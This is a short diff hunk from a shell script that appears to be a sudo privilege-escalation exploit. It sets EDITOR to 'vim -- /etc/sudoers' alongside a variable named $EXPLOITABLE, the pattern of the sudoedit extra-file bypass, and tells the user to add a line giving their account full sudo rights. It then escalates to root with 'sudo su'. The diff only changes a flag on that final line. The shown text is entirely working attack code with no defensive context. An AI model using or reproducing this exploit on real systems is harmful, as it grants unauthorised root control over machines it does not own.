@@ -37,5 +37,5 @@ echo "> Opening sudoers file, please add the following line to the file in order
 echo "$USER ALL=(ALL:ALL) ALL"
 read -n 1 -s -r -p "Press any key to continue..."
 EDITOR="vim -- /etc/sudoers" $EXPLOITABLE
-sudo su -S root
+sudo su -s root
 exit 0
